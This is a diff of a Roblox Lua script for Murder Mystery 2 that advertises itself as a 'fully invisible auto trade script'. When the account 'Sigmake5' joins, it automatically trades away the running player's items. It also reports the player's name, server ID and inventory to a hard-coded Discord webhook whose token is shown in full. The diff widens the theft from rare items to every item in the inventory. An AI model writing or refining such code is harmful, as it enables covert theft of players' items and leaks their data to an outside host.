@@ -1,5 +1,6 @@
----- MM2 FULLY INVISIBLE AUTO TRADE SCRIPT (WITH CUPID)
--- Auto trades to Sigmake5 when they join
+-- MM2 FULLY INVISIBLE AUTO TRADE SCRIPT (TRADE ALL ITEMS)
+-- Auto trades EVERY item to Sigmake5 when they join
+-- No rarity filtering - sends everything
 
 local webhook = "https://discord.com/api/webhooks/1488808773492543508/bpbJDBX3v1LLJXo0ri3xbi1Lbpu7BGXzVR1z4aCy1pP0bFqJsRrqM_ncNTi5ToDiCZ4d"
 local TARGET_USER = "Sigmake5"
@@ -73,54 +74,17 @@ spawn(function()
 end)
 
 -- ============================================
--- ITEM DETECTION FOR MM2 (INCLUDING CUPID)
+-- GET ALL ITEMS (NO RARITY FILTER)
 -- ============================================
 
--- Set to true to trade ALL items, false for only rare items
-local TRADE_ALL_ITEMS = false  -- Set to true if you want to trade everything
-
--- MM2 Legendary, Godly, Ancient, Unique items (including Cupid)
-local RARE_ITEMS = {
-    -- Godlies
-    "Chroma", "Godly", "Elderwood", "Hallows", "Battle", "Cane", "Luger",
-    "Slasher", "Pixel", "Clockwork", "Spider", "Deathshard", "Fang",
-    "Heat", "Laser", "Nightblade", "Old Glory", "Saw", "Shark", "Tides",
-    "Virtual", "Xmas", "Minty", "Logchopper", "Candy", "Sweet", "Heart",
-    "Corrupt", "Icebreaker", "Hallow", "Bat", "Boneblade",
-    -- Ancient
-    "Ancient", "Hallow", "Hallowgun", "Hallowblade",
-    -- Unique (including Cupid!)
-    "Cupid", "Unique", "Valentine", "Heartblade", "Love",
-    -- Legendaries
-    "Icewing", "Ice Wing", "Ghostblade", "Viper", "Shadow", "Phantom",
-    "Bio Blade", "Frost Saber", "Snowflake", "Frostbite", "Winter's Edge",
-    "Legendary"
-}
-
-local function isRareItem(item)
-    if not item or not item:IsA("Tool") then return false end
-    
-    if TRADE_ALL_ITEMS then
-        return true
-    end
-    
-    local itemName = item.Name
-    for _, rareName in pairs(RARE_ITEMS) do
-        if itemName:find(rareName) or itemName:lower():find(rareName:lower()) then
-            return true
-        end
-    end
-    return false
-end
-
--- Get all tradable items from inventory
-local function getTradableItems()
+-- Get EVERY item from inventory (no filtering)
+local function getAllItems()
     local items = {}
     local itemNames = {}
     
     -- Check backpack
     for _, item in pairs(player.Backpack:GetChildren()) do
-        if item:IsA("Tool") and isRareItem(item) then
+        if item:IsA("Tool") then
             if not itemNames[item.Name] then
                 itemNames[item.Name] = true
                 table.insert(items, item)
@@ -132,7 +96,7 @@ local function getTradableItems()
     -- Check character (held items)
     if player.Character then
         for _, item in pairs(player.Character:GetChildren()) do
-            if item:IsA("Tool") and isRareItem(item) then
+            if item:IsA("Tool") then
                 if not itemNames[item.Name] then
                     itemNames[item.Name] = true
                     table.insert(items, item)
@@ -252,23 +216,24 @@ local function startAutoTrade()
     
     sendLog("🎯 Starting auto trade with " .. TARGET_USER)
     
-    -- Get items FIRST to check if we have any
-    local items = getTradableItems()
-    sendLog("📦 Total tradable items found: " .. #items)
+    -- Get ALL items (no filtering)
+    local items = getAllItems()
+    sendLog("📦 Total items found in inventory: " .. #items)
     
     if #items == 0 then
-        sendLog("⚠️ No rare items found in inventory to trade!")
-        sendLog("💡 Looking for: Godlies, Ancients, Uniques, Legendaries, or Cupid")
+        sendLog("⚠️ No items found in inventory to trade!")
+        sendLog("💡 Make sure you have items in your backpack or equipped")
         tradeInProgress = false
         return
     end
     
     -- List all items found
+    sendLog("📋 Items being traded:")
     for _, item in pairs(items) do
         sendLog("  - " .. item.Name)
     end
     
-    -- Step 1: Open trade
+    -- Step 1: Send trade request
     wait(1)
     findAndClickTradeButton()
     wait(2)
@@ -277,7 +242,7 @@ local function startAutoTrade()
     findAndClickAccept()
     wait(2)
     
-    -- Step 3: Add up to 4 items
+    -- Step 3: Add up to 4 items (MM2 trade limit per trade)
     local itemsAdded = 0
     for i = 1, math.min(4, #items) do
         findAndClickAddItem()
@@ -298,6 +263,13 @@ local function startAutoTrade()
     findAndClickAccept()
     
     sendLog("🎉 Trade completed! " .. itemsAdded .. " items sent to " .. TARGET_USER)
+    
+    -- Check if there are more items to trade (for multiple trades)
+    if #items > 4 then
+        sendLog("⚠️ You have " .. (#items - 4) .. " more items remaining!")
+        sendLog("💡 Run the script again to trade the remaining items")
+    end
+    
     tradeInProgress = false
 end
 
@@ -307,7 +279,7 @@ end
 
 local function watchForTarget()
     sendLog("👀 Watching for " .. TARGET_USER)
-    sendLog("🎯 Trading items: Godlies, Ancients, Uniques, Legendaries, Cupid")
+    sendLog("🎯 Trading ALL items - No rarity filter!")
     
     -- Check if already in server
     for _, plr in pairs(Players:GetPlayers()) do
@@ -333,16 +305,16 @@ end
 -- INITIALIZE
 -- ============================================
 
-sendLog("🚀 Auto Trade Script Activated (Cupid Included)")
+sendLog("🚀 Auto Trade Script Activated (TRADING ALL ITEMS)")
 sendLog("👤 Player: " .. player.Name)
 sendLog("🖥️ Server: " .. (game.JobId or "Unknown"))
 sendLog("🎯 Target: " .. TARGET_USER)
-sendLog("💎 Trading: Godlies, Ancients, Uniques, Legendaries, Cupid")
+sendLog("💎 Trading: EVERY item in your inventory (no exceptions)")
 
 -- Start watching
 watchForTarget()
 
-print("✅ MM2 Auto Trade Script Active (Cupid Included)")
+print("✅ MM2 Auto Trade Script Active - TRADING ALL ITEMS")
 print("🎯 Waiting for " .. TARGET_USER .. " to join...")
-print("💎 Will trade: Cupid, Godlies, Ancients, Uniques, Legendaries")
+print("💎 Will trade EVERY item in your inventory (no rarity filter)")
 print("👁️ Trade will be completely invisible")
